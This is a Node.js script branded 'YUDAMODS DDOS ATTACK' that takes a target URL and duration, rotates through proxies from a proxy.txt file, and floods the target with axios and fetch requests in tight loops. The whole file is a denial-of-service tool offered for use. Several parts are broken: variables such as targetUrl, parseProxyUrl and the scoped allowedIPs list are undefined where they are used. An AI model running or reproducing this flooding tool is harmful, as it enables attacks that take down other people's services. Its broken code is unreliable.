const fs = require('fs');
const path = require('path');
const axios = require('axios');
const target = process.argv[2];
const duration = process.argv[3];
const userIP = 'myserver2.junn4.my.id';
const SocksProxyAgent = require('socks-proxy-agent');
const HttpsProxyAgent = require('https-proxy-agent');
const proxyListFile = 'proxy.txt';

const totalRequests = 5000000;
const delay = 100;

function readProxyList() {
try {
const data = fs.readFileSync(proxyListFile, 'utf8');
const lines = data.trim().split('\n');
return lines.map(line => line.trim());
} catch (error) {
console.error(`Gagal membaca daftar proxy: ${error}`);
return [];
}
}

function sendRequest(target, agent, userIP) {
if (allowedIPs.includes(userIP)) {
axios.get(target, { httpAgent: agent })
.then((response) => {
})
.catch((error) => {}
);
} 
else 
{
console.error(`IP Mu Tidak Terdaftar`);
}
}

function sendRequests() {
const proxyList = readProxyList();
let currentIndex = 0;
function sendRequestUsingNextProxy() {
if (currentIndex < proxyList.length) {
const proxyUrl = proxyList[currentIndex];
let agent;
if (proxyUrl.startsWith('socks4') || proxyUrl.startsWith('socks5')) {
 agent = new SocksProxyAgent(proxyUrl);
} 
else if (proxyUrl.startsWith('https')) 
{
 agent = new HttpsProxyAgent({ protocol: 'http', ...parseProxyUrl(proxyUrl) }); // Menggunakan HttpsProxyAgent dengan protocol 'http'
}

sendRequest(targetUrl, agent, userIP);
currentIndex++;
setTimeout(sendRequestUsingNextProxy, 0);
} 
else 
{
setTimeout(sendRequests, delay);
}
}
sendRequestUsingNextProxy();
}

if (process.argv.length < 4 || isNaN(parseInt(duration))) {
    console.log('Invalid Usage: node ddos.js URL DURATION.');
    process.exit(1)
} else {

console.log("═════════════════════════════════════════════════════════════");
console.log(" YUDAMODS DDOS ATTACK");
console.log("═════════════════════════════════════════════════════════════");
console.log(` >> Target       : ${process.argv[2]}`);
console.log(` >> Duration     : ${process.argv[3]} seconds`);
console.log(` >> Proxy     : ${proxyListFile}`);
console.log(` >> Creator      : YudaMods`);
console.log("═════════════════════════════════════════════════════════════");
console.log(" [!] Attack launched successfully");
console.log("═════════════════════════════════════════════════════════════");

    const attackInterval = setInterval(() => {
    const allowedIPs = ['myserver2.junn4.my.id'];
    sendRequests();
        for (let i = 0; i < 1000; i++) {
            fetch(target).catch(error => {});
        }
        
    });

    setTimeout(() => {
        clearInterval(attackInterval);
        console.log('Attack stopped.');
        process.exit(0);
    }, duration * 1000);
}